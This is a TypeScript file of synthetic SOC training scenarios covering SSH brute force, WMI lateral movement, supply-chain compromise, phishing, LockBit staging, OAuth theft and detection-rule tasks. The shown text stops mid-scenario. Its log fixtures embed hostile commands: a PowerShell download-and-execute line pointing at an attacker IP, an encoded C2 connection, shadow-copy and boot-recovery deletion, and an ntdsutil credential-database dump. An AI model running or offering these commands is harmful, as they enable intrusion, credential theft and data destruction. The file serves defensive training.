/**
 * lib/dojo2-scenarios.ts
 *
 * Scenario & Data Engine for Dojo 2 (AI Secures Assets).
 *
 * Contains:
 *  - DOJO2_PREBUILT_SCENARIOS  — 12 hand-crafted, SOC-realistic incident scenarios
 *    covering Log Triage, Alert Enrichment, Detection Rule Generation, and
 *    Incident Report Draft at Beginner / Intermediate / Advanced difficulty.
 *  - generateDojo2Scenario()   — runtime generator that produces randomised but
 *    internally consistent incidents across multiple attack types and difficulties.
 *  - getDojo2ScenariosByTask() — selector helper used by the UI.
 *
 * Data quality rules (enforced throughout):
 *  • IOCs use valid formats (RFC-compliant IPs, plausible domains, 32/40/64-char hashes)
 *  • All techniques reference real MITRE ATT&CK T-codes
 *  • Logs contain consistent timestamps, host names, and user accounts
 *  • Malicious events are seeded among benign baseline traffic
 */

// ─── Types ────────────────────────────────────────────────────────────────────

export type Dojo2TaskType =
  | 'log-triage'
  | 'alert-enrichment'
  | 'detection-rule-gen'
  | 'incident-report-draft';

export type Dojo2Difficulty = 'beginner' | 'intermediate' | 'advanced';

export type Dojo2AttackCategory =
  | 'Brute Force'
  | 'Phishing'
  | 'Lateral Movement'
  | 'Ransomware'
  | 'C2 Beaconing'
  | 'Credential Dumping'
  | 'DNS Tunneling'
  | 'Supply Chain'
  | 'Cloud Identity Abuse'
  | 'Malware Execution';

export interface Dojo2MitreRef {
  tactic: string;
  techniques: string[];   // e.g. ['T1110.001 – Brute Force: Password Guessing']
}

export interface Dojo2IOCs {
  ips: string[];
  domains: string[];
  hashes: string[];
  other?: string[];       // registry keys, filenames, user-agents, etc.
}

export interface Dojo2IncidentScenario {
  id: string;
  title: string;
  taskType: Dojo2TaskType;
  difficulty: Dojo2Difficulty;
  attackCategory: Dojo2AttackCategory;
  mitre: Dojo2MitreRef;
  iocs: Dojo2IOCs;
  /** Short one-sentence prompt shown in the scenario card. */
  description: string;
  /** Full incident data pasted into the chat input when the scenario is loaded. */
  incidentData: string;
  generated?: boolean;
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function randomHex(len: number): string {
  const chars = '0123456789abcdef';
  let out = '';
  for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * 16)];
  return out;
}

function randomExtIp(): string {
  const octets = [185, 91, 45, 51, 194, 104, 149, 23, 176, 87];
  return `${octets[Math.floor(Math.random() * octets.length)]}.${rnd(1,250)}.${rnd(1,250)}.${rnd(1,254)}`;
}

function randomIntIp(): string {
  return `10.${rnd(0,5)}.${rnd(0,20)}.${rnd(1,254)}`;
}

function rnd(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomUser(): string {
  const names = ['john.smith','jane.doe','mike.chen','sarah.wilson','alex.johnson','emma.davis','chris.brown','lisa.taylor'];
  return names[Math.floor(Math.random() * names.length)];
}

function randomHost(prefix: 'WS' | 'SRV' | 'DC'): string {
  const depts = ['FINANCE','HR','IT','SALES','DEV','OPS','MGMT','RESEARCH'];
  return `${prefix}-${depts[Math.floor(Math.random() * depts.length)]}-${String(rnd(1,30)).padStart(2,'0')}`;
}

function randomDomain(): string {
  const pre  = ['cdn-updates','api-service','secure-login','telemetry','update-check','auth-portal','sync-data','analytics-hub'];
  const mid  = ['microsoft','cloudflare','azure','amazon','office365','google'];
  const tld  = ['net','io','com','org','cc'];
  return `${pre[Math.floor(Math.random()*pre.length)]}.${mid[Math.floor(Math.random()*mid.length)]}-${randomHex(4)}.${tld[Math.floor(Math.random()*tld.length)]}`;
}

function ts(base: Date, plusSeconds: number): string {
  return new Date(base.getTime() + plusSeconds * 1000).toISOString().replace('.000Z', 'Z');
}

// ─── Prebuilt Scenarios ───────────────────────────────────────────────────────

export const DOJO2_PREBUILT_SCENARIOS: Dojo2IncidentScenario[] = [

  // ══════════════════════════════════════════════════════════════════════════
  // LOG TRIAGE
  // ══════════════════════════════════════════════════════════════════════════

  {
    id: 'LT-001',
    title: 'SSH Brute Force – Linux Web Server',
    taskType: 'log-triage',
    difficulty: 'beginner',
    attackCategory: 'Brute Force',
    mitre: {
      tactic: 'Credential Access',
      techniques: ['T1110.001 – Brute Force: Password Guessing'],
    },
    iocs: { ips: ['185.220.101.47', '192.168.1.105'], domains: [], hashes: [] },
    description: 'SSH auth log showing a brute-force campaign that ultimately succeeded. Identify the breach point and post-compromise actions.',
    incidentData: `INCIDENT: SSH Authentication Log Analysis
Host: web-prod-01 | Log: /var/log/auth.log
Timeframe: 2024-03-15T02:11:03Z – 02:11:30Z

2024-03-15T02:11:03Z sshd[4821]: Failed password for invalid user admin from 185.220.101.47 port 54321 ssh2
2024-03-15T02:11:04Z sshd[4822]: Failed password for invalid user root from 185.220.101.47 port 54322 ssh2
2024-03-15T02:11:05Z sshd[4823]: Failed password for invalid user ubuntu from 185.220.101.47 port 54323 ssh2
2024-03-15T02:11:06Z sshd[4824]: Failed password for invalid user test from 185.220.101.47 port 54324 ssh2
2024-03-15T02:11:07Z sshd[4825]: Failed password for root from 185.220.101.47 port 54325 ssh2
2024-03-15T02:11:08Z sshd[4826]: Failed password for root from 185.220.101.47 port 54326 ssh2
2024-03-15T02:11:09Z sshd[4827]: Failed password for root from 185.220.101.47 port 54327 ssh2
2024-03-15T02:11:10Z sshd[4828]: Failed password for root from 185.220.101.47 port 54328 ssh2
2024-03-15T02:11:11Z sshd[4829]: Failed password for svcadmin from 185.220.101.47 port 54329 ssh2
2024-03-15T02:11:12Z sshd[4830]: Failed password for svcadmin from 185.220.101.47 port 54330 ssh2
2024-03-15T02:11:13Z sshd[4831]: Failed password for svcadmin from 185.220.101.47 port 54331 ssh2
2024-03-15T02:11:14Z sshd[4832]: Accepted password for svcadmin from 185.220.101.47 port 54332 ssh2
2024-03-15T02:11:14Z sshd[4832]: pam_unix(sshd:session): session opened for user svcadmin by (uid=0)
2024-03-15T02:11:15Z sshd[4833]: New session 12 of user svcadmin
2024-03-15T02:11:22Z sudo[4840]: svcadmin : TTY=pts/0 ; PWD=/home/svcadmin ; USER=root ; COMMAND=/usr/bin/whoami
2024-03-15T02:11:28Z sudo[4841]: svcadmin : TTY=pts/0 ; PWD=/home/svcadmin ; USER=root ; COMMAND=/bin/bash
2024-03-15T02:11:30Z sshd[4842]: Received disconnect from 192.168.1.105 port 12345: 11: Normal Shutdown

Analyze this incident: classify the attack, extract all IOCs, determine whether the breach succeeded, and recommend immediate containment actions.`,
  },

  {
    id: 'LT-002',
    title: 'PowerShell Lateral Movement via WMI',
    taskType: 'log-triage',
    difficulty: 'intermediate',
    attackCategory: 'Lateral Movement',
    mitre: {
      tactic: 'Lateral Movement / Execution',
      techniques: [
        'T1021.006 – Remote Services: Windows Remote Management',
        'T1059.001 – Command and Scripting Interpreter: PowerShell',
        'T1055 – Process Injection',
      ],
    },
    iocs: {
      ips: ['10.0.5.22', '10.0.5.87', '10.0.5.44'],
      domains: ['update-cdn.microsoft-patch.net'],
      hashes: ['a3f5c2e1b4d6e8f0a1b2c3d4e5f6a7b8', '9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b'],
      other: ['C:\\Windows\\Temp\\svchost32.dll', '\\\\.\\pipe\\MSSE-4821-server'],
    },
    description: 'Sysmon + Windows Security logs showing WMI-spawned PowerShell, C2 beaconing, and credential dumping via lsass. Reconstruct the lateral movement chain.',
    incidentData: `INCIDENT: Sysmon + Windows Security Event Bundle
Host: WS-FINANCE-04 (10.0.5.44) | Analyst: Tier 2 Escalation
Timeframe: 2024-03-18T09:14:31Z – 09:15:40Z

[Security] EventID=4648 2024-03-18T09:14:31Z
  AccountName: svc_backup
  TargetServerName: WS-FINANCE-04
  SourceWorkstation: WS-IT-12 (10.0.5.22)
  LogonType: 3 (Network)

[Sysmon] EventID=1 (Process Create) 2024-03-18T09:14:32Z
  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  CommandLine: powershell.exe -NoP -sta -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAdQBwAGQAYQB0AGUALQBjAGQAbgAuAG0AaQBjAHIAbwBzAG8AZgB0AC0AcABhAHQAYwBoAC4AbgBlAHQAIgAsADQ0ADMAKQA=
  ParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe
  User: CORP\\svc_backup
  ProcessId: 7744 | ParentProcessId: 2136

[Sysmon] EventID=3 (Network Connection) 2024-03-18T09:14:45Z
  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  DestinationIp: 10.0.5.87 → external proxy → update-cdn.microsoft-patch.net
  DestinationPort: 443 | Protocol: tcp
  ProcessId: 7744

[Sysmon] EventID=11 (File Create) 2024-03-18T09:14:48Z
  TargetFilename: C:\\Windows\\Temp\\svchost32.dll
  Hashes: MD5=a3f5c2e1b4d6e8f0a1b2c3d4e5f6a7b8

[Sysmon] EventID=17 (Pipe Created) 2024-03-18T09:14:49Z
  PipeName: \\\\.\\pipe\\MSSE-4821-server
  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  (Known CobaltStrike default named-pipe pattern)

[Security] EventID=4648 2024-03-18T09:15:10Z
  AccountName: svc_backup | TargetServerName: WS-ACCT-07 | LogonType: 3

[Security] EventID=4648 2024-03-18T09:15:34Z
  AccountName: svc_backup | TargetServerName: DC01 | LogonType: 3

[Security] EventID=4672 2024-03-18T09:15:34Z
  AccountName: svc_backup
  PrivilegeList: SeDebugPrivilege, SeImpersonatePrivilege, SeTcpipClientPrivilege

[Sysmon] EventID=10 (Process Access) 2024-03-18T09:15:40Z
  SourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  TargetImage: C:\\Windows\\System32\\lsass.exe
  GrantedAccess: 0x1010
  Hashes: MD5=9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b

Analyze this incident: decode the base64 PowerShell command if possible, map each event to MITRE ATT&CK, reconstruct the attack chain, extract all IOCs, and provide containment recommendations.`,
  },

  {
    id: 'LT-003',
    title: 'Multi-Stage APT: Supply Chain → Domain Compromise',
    taskType: 'log-triage',
    difficulty: 'advanced',
    attackCategory: 'Supply Chain',
    mitre: {
      tactic: 'Multiple Tactics',
      techniques: [
        'T1195.002 – Supply Chain Compromise: Software Supply Chain',
        'T1055 – Process Injection',
        'T1003.003 – OS Credential Dumping: NTDS',
        'T1048 – Exfiltration Over Alternative Protocol',
      ],
    },
    iocs: {
      ips: ['91.215.85.209', '45.141.87.103', '192.168.10.50'],
      domains: ['telemetry-cdn.solarwinds-updates.org', 'api.cloudflare-dns.io'],
      hashes: ['7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069'],
      other: ['SolarWinds.Orion.Core.dll', 'ntds.dit', 'C:\\Windows\\Temp\\ntds_bk'],
    },
    description: '72-hour multi-source log bundle from a suspected nation-state intrusion via trojanised software. Reconstruct the full kill chain and scope the blast radius.',
    incidentData: `INCIDENT: Multi-Source APT Log Bundle — ESCALATED P1
Scope: BUILD-SRV-01, DC01, CORP-MAIL | Duration: 72 hours
Incident ID: INC-2024-0392 | Classification: CRITICAL

=== BUILD-SRV-01 | Application Logs | 2024-03-10T11:22:14Z ===
SolarWinds.Orion.Core.dll loaded: C:\\Program Files\\SolarWinds\\Orion\\SolarWinds.Orion.Core.dll
DLL SHA256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069
[WARNING] DLL compile timestamp: 2024-02-28 | Code-signing cert date: 2023-11-14 — MISMATCH

=== BUILD-SRV-01 | Sysmon EventID=7 | 2024-03-10T11:22:15Z ===
Image: C:\\Windows\\SysWOW64\\rundll32.exe
ImageLoaded: C:\\Program Files\\SolarWinds\\Orion\\SolarWinds.Orion.Core.dll
Signed: True | Issuer: Solarwinds Worldwide LLC
[ANOMALY] Certificate serial number does not match vendor registry

=== BUILD-SRV-01 | Sysmon EventID=3 | 2024-03-10T11:22:31Z ===
Image: rundll32.exe → DestinationIp: 91.215.85.209:443
DestinationHostname: telemetry-cdn.solarwinds-updates.org
Beacon size: 4096 bytes | JA3: 51c64c77e60f3980eea90869b68c58a8

=== DC01 | Security EventID=4769 | 2024-03-11T03:44:55Z ===
AccountName: SolarWindsOrionAcct | ServiceName: krbtgt
ClientAddress: 192.168.10.50
EncryptionType: 0x17 (RC4-HMAC) — [ANOMALY: org policy mandates AES256]
TicketOptions: 0x40810010

=== DC01 | Security EventID=4624 | 2024-03-11T03:45:01Z ===
AccountName: Administrator | LogonType: 9 (NewCredentials)
SourceWorkstation: BUILD-SRV-01 | AuthPackage: NTLM

=== DC01 | Sysmon EventID=1 | 2024-03-11T03:45:12Z ===
Image: C:\\Windows\\System32\\ntdsutil.exe
CommandLine: ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds_bk" q q
User: CORP\\Administrator | ProcessId: 9912

=== CORP-MAIL | Exchange Transport Log | 2024-03-11T04:01:33Z ===
From: IT-Automation@corp.internal (SolarWindsOrionAcct)
To: archive-service@api.cloudflare-dns.io
Subject: re: infrastructure-backup-0311
Attachment: ntds.dit (89.4 MB) — SMTP relay: 45.141.87.103
SMTP Status: 250 2.6.0 Message accepted for delivery

=== EDR Alerts | 2024-03-12T07:18:00Z ===
[HIGH] Unusual LSASS access by SolarWinds process
[HIGH] NTDS.dit accessed outside scheduled backup window
[HIGH] Outbound SMTP relay to non-corporate endpoint (45.141.87.103)

Analyze this incident: identify the initial compromise vector, map the full kill chain to MITRE ATT&CK, extract every IOC, assess the blast radius (what data was compromised), and provide a prioritised remediation plan.`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // ALERT ENRICHMENT
  // ══════════════════════════════════════════════════════════════════════════

  {
    id: 'AE-001',
    title: 'Phishing Email – Macro-Enabled Excel Attachment',
    taskType: 'alert-enrichment',
    difficulty: 'beginner',
    attackCategory: 'Phishing',
    mitre: {
      tactic: 'Initial Access / Execution',
      techniques: [
        'T1566.001 – Phishing: Spearphishing Attachment',
        'T1204.002 – User Execution: Malicious File',
      ],
    },
    iocs: {
      ips: ['192.229.211.108'],
      domains: ['secure-docushare.com', 'microsoft-portal-auth.net'],
      hashes: ['3a4f5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a'],
      other: ['Invoice_Contract_2024.xlsm', 'VBA macro SHA1: 9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f'],
    },
    description: 'Email gateway alert for a spearphishing email with a macro-enabled Excel file. Enrich with sender reputation, IOC context, and endpoint execution telemetry.',
    incidentData: `INCIDENT: Email Security Gateway Alert — Enrichment Required
Alert ID: ESG-2024-1847 | Severity: HIGH | Timestamp: 2024-03-19T14:32:08Z

=== EMAIL HEADER ANALYSIS ===
FROM: "DocuSign Support" <support-notifications@secure-docushare.com>
TO: jane.wilson@corp.internal
SUBJECT: ACTION REQUIRED: Contract Pending Your Signature – Expires in 24hrs
ENVELOPE-FROM: bounce-12847@secure-docushare.com

SPF: FAIL | DKIM: FAIL | DMARC: FAIL
Sending IP: 192.229.211.108

=== ATTACHMENT ===
Filename: Invoice_Contract_2024.xlsm
SHA256: 3a4f5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
File Size: 142,884 bytes | Type: Excel Macro-Enabled Workbook
Macro Present: YES | Signed: NO

=== EMBEDDED URLs ===
URL 1: https://microsoft-portal-auth.net/verify?token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
URL 2: http://192.229.211.108/payload/stage2.bin

=== SENDER REPUTATION (Pre-Enrichment) ===
192.229.211.108 — [PENDING ENRICHMENT]
secure-docushare.com — [PENDING ENRICHMENT]
microsoft-portal-auth.net — [PENDING ENRICHMENT]

=== ENDPOINT TELEMETRY (WS-HR-09 — jane.wilson) ===
14:33:42Z File written: C:\\Users\\jane.wilson\\Downloads\\Invoice_Contract_2024.xlsm
14:34:01Z EXCEL.EXE launched: Invoice_Contract_2024.xlsm
14:34:09Z EXCEL.EXE spawned: CMD.EXE (PID 8821)
14:34:10Z CMD.EXE executed: powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.229.211.108/payload/stage2.bin')"
14:34:15Z Network connection to 192.229.211.108:80 — ESTABLISHED
14:34:17Z File dropped: C:\\Users\\jane.wilson\\AppData\\Roaming\\svchost.exe

Enrich this alert: assess sender and IP reputation, classify the attack type with MITRE ATT&CK mapping, determine whether execution occurred, rate overall severity, and recommend immediate response actions.`,
  },

  {
    id: 'AE-002',
    title: 'Ransomware Staging – LockBit 3.0 Pre-Encryption Activity',
    taskType: 'alert-enrichment',
    difficulty: 'intermediate',
    attackCategory: 'Ransomware',
    mitre: {
      tactic: 'Impact / Command and Control',
      techniques: [
        'T1486 – Data Encrypted for Impact',
        'T1490 – Inhibit System Recovery',
        'T1071.001 – Application Layer Protocol: Web Protocols',
        'T1021.002 – Remote Services: SMB/Windows Admin Shares',
      ],
    },
    iocs: {
      ips: ['5.188.86.172', '10.0.1.15', '10.0.1.88'],
      domains: ['c2-panel.darkhotel-infra.net'],
      hashes: ['b14c2b2b8e9d4f7a3c1e5d6f8a9b2c4e', 'f3a1b2c4d5e6f7a8b9c0d1e2f3a4b5c6'],
      other: ['lockbit-recover.onion', '*.lockbit3 file extension', 'README.lockbit3.txt'],
    },
    description: 'SIEM correlation alert bundle for active ransomware staging: shadow copy deletion, C2 exfil (~808 MB), and lateral spread to a second host before encryption. Correlate and scope.',
    incidentData: `INCIDENT: SIEM Correlation Alert Bundle — RANSOMWARE PRE-STAGING
Rule: RANSOMWARE_PRE_STAGING | Confidence: HIGH | Triggered: 2024-03-20T22:15:00Z
Primary Host: WS-SALES-15 (10.0.1.15) | User: mike.chen

=== DEFENSE EVASION / IMPACT PREP (22:15 – 22:17) ===
[22:15:03] EDR: vssadmin.exe delete shadows /all /quiet
[22:15:04] EDR: wbadmin.exe delete catalog -quiet
[22:15:05] EDR: bcdedit.exe /set {default} recoveryenabled No
[22:15:06] EDR: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
[22:15:07] EDR: wmic.exe shadowcopy delete

=== C2 EXFILTRATION (22:17) ===
[22:17:31] NGFW: Outbound HTTPS → 5.188.86.172:443 (c2-panel.darkhotel-infra.net)
  Bytes Out: 847,293,184 (~808 MB) | Duration: 1,847 seconds
  JA3: 72a7c5b3d8e9f1a2b3c4d5e6f7a8b9c0

=== LATERAL MOVEMENT (22:31) ===
[22:31:12] SMB: WS-SALES-15 → \\\\10.0.1.88\\ADMIN$ | File Written: svc_update.exe
  Hash: f3a1b2c4d5e6f7a8b9c0d1e2f3a4b5c6
[22:31:45] EDR on WS-DEV-22 (10.0.1.88): svc_update.exe executed
  Signature cluster match: LockBit 3.0

=== ENCRYPTION EVENT (22:45 – 22:46) ===
[22:45:00] WS-SALES-15: Mass rename — 14,847 files → *.lockbit3 (7 minutes)
[22:45:02] Ransom note dropped: C:\\Users\\Public\\Desktop\\README.lockbit3.txt
  Recovery URL: http://lockbit-recover.onion/7f8a9b0c1d2e3f4
[22:46:12] WS-DEV-22: Mass encryption — 9,234 files

=== THREAT INTEL (Raw — Needs Enrichment) ===
5.188.86.172 — [PENDING ENRICHMENT]
b14c2b2b8e9d4f7a3c1e5d6f8a9b2c4e — [PENDING ENRICHMENT]
f3a1b2c4d5e6f7a8b9c0d1e2f3a4b5c6 — [PENDING ENRICHMENT]

Enrich this alert bundle: confirm ransomware family, assess exfiltration scope (double-extortion risk), enumerate all affected hosts, extract and enrich every IOC, map to MITRE ATT&CK, and provide a prioritised IR action plan.`,
  },

  {
    id: 'AE-003',
    title: 'APT29-Style OAuth Token Theft – M365 Cloud Pivot',
    taskType: 'alert-enrichment',
    difficulty: 'advanced',
    attackCategory: 'Cloud Identity Abuse',
    mitre: {
      tactic: 'Credential Access / Collection',
      techniques: [
        'T1528 – Steal Application Access Token',
        'T1530 – Data from Cloud Storage Object',
        'T1136.003 – Create Account: Cloud Account',
      ],
    },
    iocs: {
      ips: ['51.89.115.197', '104.21.56.89'],
      domains: ['login-microsoftonline-oauth.com', 'graph-api-service.net'],
      hashes: [],
      other: [
        'App ID: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d',
        'Publisher: "Microsott Corp" (typosquat)',
        'it-support-backup@corp.com (rogue admin)',
      ],
    },
    description: 'Microsoft Sentinel incident: OAuth consent phishing against CFO account, Graph API mass-email exfil, rogue Global Admin creation, and 24 GB SharePoint download — all within 30 minutes.',
    incidentData: `INCIDENT: Microsoft Sentinel — SI-2024-0892 | CRITICAL
Created: 2024-03-21T08:00:00Z | Status: Active | MFA bypassed via OAuth

=== ALERT 1: Suspicious OAuth App Consent (08:01:14Z) ===
User: cfo@corp.com
App Name: "Microsoft Teams Meeting Add-in"
App ID: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d
Publisher: "Microsott Corp" (NOTE: typosquat — not Microsoft Corp)
Permissions Granted: Mail.ReadWrite, Files.ReadWrite.All, offline_access
Consent IP: 51.89.115.197 (France) — CFO normally authenticates from New York
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Python-urllib/3.8

=== ALERT 2: Impossible Travel Detected (08:15:22Z) ===
User: cfo@corp.com
Location 1: New York, US @ 08:01:14Z
Location 2: Paris, France @ 08:15:22Z
Distance: 5,831 km | Time delta: 14 minutes — PHYSICALLY IMPOSSIBLE

=== ALERT 3: Mass Email Read via Graph API (08:22:00Z) ===
App: 9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d
Endpoint: GET https://graph.microsoft.com/v1.0/me/messages?$top=999 (×15 calls)
Messages Read: 14,882 | Folders: Inbox, Sent Items, Drafts, Board Meeting Prep
Exfil Dest: graph-api-service.net (104.21.56.89) | Duration: 4 min 12 sec

=== ALERT 4: Rogue Global Admin Created (08:27:55Z) ===
Actor: cfo@corp.com (compromised OAuth token)
New Account: it-support-backup@corp.com
Roles: Global Administrator, Exchange Administrator
MFA Status: NOT CONFIGURED

=== ALERT 5: SharePoint Bulk Download (08:31:09Z) ===
Actor: it-support-backup@corp.com
Sites: HR-Confidential, Finance-Board-2024, M&A-Pipeline
Files Downloaded: 1,847 files (24.3 GB) → 51.89.115.197

=== THREAT INTEL (Needs Enrichment) ===
51.89.115.197 — [PENDING ENRICHMENT]
App ID 9a8b7c6d — [PENDING ENRICHMENT]
login-microsoftonline-oauth.com — [PENDING ENRICHMENT]

Enrich this Sentinel incident: classify the attack chain (initial access through exfiltration), confirm the threat actor pattern, enrich all IOCs, assess persistence mechanisms, and outline emergency containment steps.`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // DETECTION RULE GENERATION
  // ══════════════════════════════════════════════════════════════════════════

  {
    id: 'DR-001',
    title: 'Detect CobaltStrike Beacon – File, Process & Network Indicators',
    taskType: 'detection-rule-gen',
    difficulty: 'beginner',
    attackCategory: 'C2 Beaconing',
    mitre: {
      tactic: 'Command and Control',
      techniques: ['T1071.001 – Application Layer Protocol: Web Protocols', 'T1055 – Process Injection'],
    },
    iocs: {
      ips: ['204.13.164.118', '185.99.135.108'],
      domains: ['cdn-updates.azurewebsites-secure.net'],
      hashes: ['a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456'],
      other: [
        'PE section: .soc (non-standard)',
        'Named pipe: \\\\.\\pipe\\MSSE-*-server',
        'JA3: 72a7c5b3d8e9f1a2b3c4d5e6f7a8b9c0',
        'URI pattern: /jquery-3.3.1.min.js, /updates/check',
        'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
      ],
    },
    description: 'You have CobaltStrike beacon IOCs and behavioral indicators. Generate a YARA rule, a Sigma rule for process behavior, and a Suricata network rule for C2 detection.',
    incidentData: `TASK: Detection Rule Generation — CobaltStrike Beacon 4.x
Incident Context: INC-2024-0312 | Confidence: HIGH

=== FILE INDICATORS ===
Beacon DLL: C:\\Windows\\Temp\\winsvc32.dll
SHA256: a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456
File Size: 208,896 bytes
PE Sections: .text, .rdata, .data, .rsrc, .soc  (anomaly: .soc is non-standard)
Suspicious Imports: VirtualAlloc, WriteProcessMemory, CreateRemoteThread

=== BEHAVIORAL INDICATORS ===
- EXCEL.EXE spawning CMD.EXE → PowerShell.exe (unusual parent-child chain)
- PowerShell executed with -EncodedCommand and -NoProfile flags
- rundll32.exe loading DLLs from %TEMP% directory
- Named pipe created: \\\\.\\pipe\\MSSE-4821-server (CobaltStrike default pattern)
- Parent PID spoofing detected (reported ppid ≠ actual parent)
- Beacon interval: ~60 seconds ± jitter (15–45% random)

=== NETWORK INDICATORS ===
C2 IPs: 204.13.164.118, 185.99.135.108
C2 Domain: cdn-updates.azurewebsites-secure.net
Protocol: HTTPS/443 | JA3: 72a7c5b3d8e9f1a2b3c4d5e6f7a8b9c0
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
URI Patterns: /jquery-3.3.1.min.js, /updates/check, /api/v1/status

Generate three detection rules:
1. A YARA rule targeting the PE .soc section and suspicious imports
2. A Sigma rule detecting the EXCEL.EXE → CMD.EXE → PowerShell.exe process chain
3. A Suricata rule matching the C2 JA3 hash and URI patterns
Include false-positive notes and tuning guidance for each rule.`,
  },

  {
    id: 'DR-002',
    title: 'DNS Tunneling Detection – Statistical + Signature Approach',
    taskType: 'detection-rule-gen',
    difficulty: 'intermediate',
    attackCategory: 'DNS Tunneling',
    mitre: {
      tactic: 'Exfiltration / Command and Control',
      techniques: [
        'T1048.003 – Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol',
        'T1071.004 – Application Layer Protocol: DNS',
      ],
    },
    iocs: {
      ips: ['10.0.2.45'],
      domains: ['tunnel-c2.io', 'ns1.tunnel-c2.io'],
      hashes: [],
      other: [
        'TXT query rate: 63/min (baseline: <5/min)',
        'Avg subdomain label length: 89 chars (baseline: <30)',
        'Subdomain entropy: 4.7 bits/char',
        '94% of queries are TXT type',
      ],
    },
    description: 'DNS resolver logs show base64-encoded data exfiltration via TXT queries. Build both statistical anomaly detection rules and pattern-based signature rules to catch it.',
    incidentData: `TASK: Detection Rule Generation — DNS Tunneling
Source: DNS Resolver logs — WS-RESEARCH-11 (10.0.2.45)
Timeframe: 2024-03-22T06:00:00Z – 06:45:00Z (45 minutes)

=== SAMPLE QUERY LOG ===
06:00:01Z TXT QUERY: aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q=.tunnel-c2.io
06:00:02Z TXT QUERY: dGhpcyBpcyBhbm90aGVyIGJhc2U2NCBlbmNvZGVk.tunnel-c2.io
06:00:03Z TXT QUERY: cGF5bG9hZCBkYXRhIGhlcmUgZm9yIGV4ZmlsdHJhdGlvbg==.tunnel-c2.io
06:00:04Z TXT QUERY: ZXhhbXBsZSBvZiBkYXRhIGV4ZmlsdHJhdGlvbiB2aWEgRE5T.tunnel-c2.io
06:00:05Z TXT QUERY: c2Vuc2l0aXZlIGNvcnBvcmF0ZSBkYXRhIGluIGJhc2U2NA==.tunnel-c2.io
[... 2,842 further similar queries ...]

=== STATISTICAL ANOMALIES vs BASELINE ===
Metric                  | This Host (06:00–06:45) | Normal Baseline
------------------------|--------------------------|----------------
Query rate              | 63 queries/min           | < 5 queries/min
Avg subdomain length    | 89 characters            | < 30 characters
TXT record ratio        | 94% of all queries       | < 2% of all queries
Unique subdomains       | 2,847 (single domain)    | ~47 unique/day
Response size           | 255 bytes (max TXT)      | Variable
Subdomain entropy       | 4.7 bits/char            | ~2.1 bits/char (human-readable)

=== NORMAL DNS BASELINE (same host, prior week) ===
Query rate: 3.2/min | Avg label length: 24 chars | TXT ratio: 0.8%
Top domains: microsoft.com, windows.net, azure.com, corp.internal

Generate detection rules for:
1. A Sigma rule using statistical thresholds (query rate + TXT ratio + label length)
2. A Zeek/Bro detection script for entropy-based detection
3. A plain-English explanation of tuning thresholds to minimise false positives
Include notes on tools like dnstunnel, Iodine, and dnscat2 that this would catch.`,
  },

  {
    id: 'DR-003',
    title: 'Credential Dumping – LSASS & DCSync Multi-Method Detection',
    taskType: 'detection-rule-gen',
    difficulty: 'advanced',
    attackCategory: 'Credential Dumping',
    mitre: {
      tactic: 'Credential Access',
      techniques: [
        'T1003.001 – OS Credential Dumping: LSASS Memory',
        'T1003.006 – OS Credential Dumping: DCSync',
      ],
    },
    iocs: {
      ips: ['10.0.0.51', '10.0.0.10'],
      domains: [],
      hashes: ['f3e1d2c4b5a69788796a5b4c3d2e1f0a'],
      other: [
        'GUID: 1131f0aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)',
        'GUID: 1131f0ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All)',
        'comsvcs.dll MiniDump (LOLBAS technique)',
        'GrantedAccess: 0x1010, 0x1fffff',
      ],
    },
    description: 'Four LSASS dump methods observed (Mimikatz, Task Manager, ProcDump, comsvcs.dll LOLBAS) plus a DCSync attack. Build comprehensive detection rules that catch all methods including AV-bypass variants.',
    incidentData: `TASK: Detection Rule Generation — Credential Dumping (LSASS + DCSync)
Attacker has SYSTEM on WS-ADMIN-02 (10.0.0.51), escalating toward Domain Admin on DC01 (10.0.0.10)

=== LSASS DUMPING — METHOD 1: Mimikatz (Direct API) ===
Sysmon EventID=10 (Process Access):
  SourceImage: C:\\Tools\\mimikatz.exe
  TargetImage: C:\\Windows\\System32\\lsass.exe
